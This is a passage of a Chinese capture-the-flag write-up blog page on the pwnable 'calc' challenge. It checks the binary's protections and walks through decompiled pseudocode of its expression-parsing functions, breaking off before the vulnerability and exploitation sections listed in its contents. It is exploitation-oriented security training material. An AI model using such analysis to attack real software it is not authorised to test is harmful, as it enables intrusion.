@@ -1,0 +1,548 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>- shesl's blog</title><meta name=Description content="佘崧林同学的碎碎念博客"><meta property="og:title" content><meta property="og:description" content="CALC 保护等级 首先检查安全保护等级： 1 2 3 4 5 6 7 $ checksec calc [*] '/media/data/program/ctf/pwnable/calc/calc' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序开启了 NX 保护，不能执行栈代码。我们再看程序的链接方"><meta property="og:type" content="article"><meta property="og:url" content="http://shesl-meow.github.io/posts/ctf-writeup/pwnable/3.calc/"><meta property="og:image" content="http://shesl-meow.github.io/avatar.png"><meta property="article:section" content="posts"><meta property="og:site_name" content="shesl's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://shesl-meow.github.io/avatar.png"><meta name=twitter:title content><meta name=twitter:description content="CALC 保护等级 首先检查安全保护等级： 1 2 3 4 5 6 7 $ checksec calc [*] '/media/data/program/ctf/pwnable/calc/calc' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序开启了 NX 保护，不能执行栈代码。我们再看程序的链接方"><meta name=application-name content="shesl's blog"><meta name=apple-mobile-web-app-title content="shesl's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://shesl-meow.github.io/posts/ctf-writeup/pwnable/3.calc/><link rel=prev href=http://shesl-meow.github.io/posts/ctf-writeup/pwnable/4.3x17/><link rel=next href=http://shesl-meow.github.io/posts/ctf-writeup/pwnable/2.orw/><link rel=stylesheet href=/css/style.min.fa85115dce490a9d0bf009e2892b6d42439bdea75160d08cddcb0b97c8def676.css integrity="sha256-+oURXc5JCp0L8AniiSttQkOb3qdRYNCM3csLl8je9nY="><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/shesl-meow.github.io\/posts\/ctf-writeup\/pwnable\/3.calc\/"},"genre":"posts","wordcount":2630,"url":"http:\/\/shesl-meow.github.io\/posts\/ctf-writeup\/pwnable\/3.calc\/","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"佘崧林"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="shesl's blog">shesl-meow</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>博客 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="shesl's blog">shesl-meow</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>博客</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX"></h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://shesl-meow.github.io title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>佘崧林</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=0001-01-01>0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 2630 字&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 6 分钟&nbsp;<span id=/posts/ctf-writeup/pwnable/3.calc/ class=leancloud_visitors data-flag-title>
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#保护等级>保护等级</a></li><li><a href=#程序逻辑>程序逻辑</a><ul><li><a href=#main><code>main</code></a></li><li><a href=#calc-1><code>calc</code></a></li><li><a href=#get_expr><code>get_expr</code></a></li><li><a href=#eval><code>eval</code></a></li><li><a href=#parse_expr><code>parse_expr</code></a></li></ul></li><li><a href=#漏洞>漏洞</a><ul><li><a href=#发现>发现</a></li><li><a href=#利用>利用</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=calc>CALC</h1><h2 id=保护等级>保护等级</h2><p>首先检查安全保护等级：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ checksec calc
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/media/data/program/ctf/pwnable/calc/calc&#39;</span>
+</span></span><span class=line><span class=cl>    Arch:     i386-32-little
+</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:    Canary found
+</span></span><span class=line><span class=cl>    NX:       NX enabled
+</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>程序开启了 <code>NX</code> 保护，不能执行栈代码。我们再看程序的链接方式：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ objdump -R calc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>calc：     文件格式 elf32-i386
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>objdump: calc：不是动态对象
+</span></span><span class=line><span class=cl>objdump: calc: invalid operation
+</span></span></code></pre></td></tr></table></div></div><p>程序是静态链接。</p><h2 id=程序逻辑>程序逻辑</h2><h3 id=main><code>main</code></h3><p>在 <code>gdb</code> 中我们可以看到这个程序的逻辑结构过于复杂，我们使用 <code>Ida Pro</code> 打开。首先看 <code>main</code> 函数，可以在 <code>Ida Pro</code> 中查看其伪代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>ssignal</span><span class=p>(</span><span class=mi>14</span><span class=p>,</span> <span class=n>timeout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>alarm</span><span class=p>(</span><span class=mi>60</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;=== Welcome to SECPROG calculator ===&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>calc</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Merry Christmas!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=calc-1><code>calc</code></h3><p>显然 <code>calc</code> 是这个程序的主函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=nf>calc</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>buffer_len</span><span class=p>;</span> <span class=c1>// [esp+18h] [ebp-5A0h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-59Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>expr</span><span class=p>;</span> <span class=c1>// [esp+1ACh] [ebp-40Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>canary</span><span class=p>;</span> <span class=c1>// [esp+5ACh] [ebp-Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>canary</span> <span class=o>=</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>bzero</span><span class=p>(</span><span class=o>&amp;</span><span class=n>expr</span><span class=p>,</span> <span class=mh>0x400u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>get_expr</span><span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>expr</span><span class=p>,</span> <span class=mi>1024</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>init_pool</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buffer_len</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>parse_expr</span><span class=p>((</span><span class=kt>int</span><span class=p>)</span><span class=o>&amp;</span><span class=n>expr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buffer_len</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>printf</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>unk_80BF804</span><span class=p>,</span> <span class=n>buffer</span><span class=p>[</span><span class=n>buffer_len</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>      <span class=n>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>^</span> <span class=n>canary</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>并且可以查看它的调用栈：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=../calc-calc-cfg.png data-srcset="../calc-calc-cfg.png, ../calc-calc-cfg.png 1.5x, ../calc-calc-cfg.png 2x" data-sizes=auto alt=../calc-calc-cfg.png title=calc-cfg></p><p>我们逐个分析这个伪代码的功能：</p><ol><li><code>v4 = __readgsdword(0x14u)</code> 这个从 <a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=vs-2019" target=_blank rel="noopener noreffer">MSDN</a> 中可以找到函数的功能，它从与 <code>gs</code> 段起始位置相对 <code>0x14u</code> 的位置中取出一个数字并赋值给 <code>v4</code>。它应该是实现了一个 <code>Canary</code> 的功能。</li><li>循环中第一个语句 <code>bzero(%ebp - 0x40c, 0x400)</code> 仔细查看了其中的函数调用，之后又以无参数形式调用了 <code>bzero()</code> 的一个重载，不太看得懂。我们猜测是初始化的；</li><li><code>get_expr(%ebp - 0x40c, 1024)</code> 应该是从我们的标准输入读取表达式的函数，我们暂时不研究其逻辑；</li><li><code>init_pool(%ebp - 0x5a0);</code> 这个函数的作用是，将传入的指针作为一个四字节的指针，并且将这个地址之后的的 100 个位置全部赋值为 0。是一个初始化 int 数组的函数。</li><li><code>parse_expr(%ebp -0x40c, %ebp - 0x5a0)</code> 应该是将输入解析到 <code>%ebp - 0x5a0</code> 这个地方做存储结果的函数，我们暂时不研究其逻辑；</li><li>如果解析成功会调用 <code>printf((const char *)&unk_80BF804, v2[v1 - 1]);</code>，其中 <code>unk_80BF804</code> 的内容就是 <code>%d</code>，<code>v2[v1 - 1]</code> 应该是结果存储的位置（由它们的相对位置我们可以分析知道，<code>v2</code> 是一个字符串，<code>v1</code> 应该是一个标记结果与 <code>v2</code> 起始位置相对位置的整数）。</li></ol><p>逻辑清晰了，我们接着分析取表达式和解析表达式这两个关键的函数。</p><h3 id=get_expr><code>get_expr</code></h3><p>首先是 <code>get_expr</code> 读取表达式的函数，我重命名了其中的变量，逻辑非常地清晰：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>get_expr</span><span class=p>(</span><span class=kt>int</span> <span class=n>dest</span><span class=p>,</span> <span class=kt>int</span> <span class=n>max_len</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>chr_pos</span><span class=p>;</span> <span class=c1>// eax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>input_chr</span><span class=p>;</span> <span class=c1>// [esp+1Bh] [ebp-Dh]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>cur_len</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>cur_len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=n>cur_len</span> <span class=o>&lt;</span> <span class=n>max_len</span> <span class=o>&amp;&amp;</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input_chr</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=n>input_chr</span> <span class=o>!=</span> <span class=sc>&#39;\n&#39;</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>input_chr</span> <span class=o>==</span> <span class=sc>&#39;+&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=o>||</span> <span class=n>input_chr</span> <span class=o>==</span> <span class=sc>&#39;-&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=o>||</span> <span class=n>input_chr</span> <span class=o>==</span> <span class=sc>&#39;*&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=o>||</span> <span class=n>input_chr</span> <span class=o>==</span> <span class=sc>&#39;/&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=o>||</span> <span class=n>input_chr</span> <span class=o>==</span> <span class=sc>&#39;%&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=o>||</span> <span class=n>input_chr</span> <span class=o>&gt;</span> <span class=mi>47</span> <span class=o>&amp;&amp;</span> <span class=n>input_chr</span> <span class=o>&lt;=</span> <span class=mi>57</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>chr_pos</span> <span class=o>=</span> <span class=n>cur_len</span><span class=o>++</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>dest</span> <span class=o>+</span> <span class=n>chr_pos</span><span class=p>)</span> <span class=o>=</span> <span class=n>input_chr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>cur_len</span> <span class=o>+</span> <span class=n>dest</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>cur_len</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=eval><code>eval</code></h3><p>在讨论函数 <code>parse_expr</code> 之前，我们先分析在它调用最频繁的函数 <code>eval</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=o>*</span><span class=kr>__cdecl</span> <span class=nf>eval</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=n>num_stack</span><span class=p>,</span> <span class=kt>char</span> <span class=n>operator</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span> <span class=c1>// eax
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>operator</span><span class=o>==</span> <span class=sc>&#39;+&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>+=</span> <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>operator</span><span class=o>&gt;</span> <span class=mi>43</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>operator</span><span class=o>==</span> <span class=sc>&#39;-&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>-=</span> <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>operator</span><span class=o>==</span> <span class=sc>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>/=</span> <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>operator</span><span class=o>==</span> <span class=sc>&#39;*&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>*=</span> <span class=n>num_stack</span><span class=p>[</span><span class=o>*</span><span class=n>num_stack</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>num_stack</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>--*</span><span class=n>num_stack</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>简单地说这个函数做了这样一件事情：</p><ol><li>它传入一个数字栈和一个字符型的操作符</li><li>它弹出了栈顶的两个元素，对栈顶的这两个元素进行这个操作符所指定的运算</li><li>将这个运算结果压栈</li></ol><h3 id=parse_expr><code>parse_expr</code></h3><p>然后我们分析 <code>parse_expr</code>，漏洞应该就出现在这里。我通读了伪代码之后重命名了一些局部变量，并且对照汇编代码解决了一些不必要的转换之后得到以下的伪代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>signed</span> <span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>parse_expr</span><span class=p>(</span><span class=kt>int</span> <span class=n>src_str</span><span class=p>,</span> <span class=n>_DWORD</span> <span class=o>*</span><span class=n>dest</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
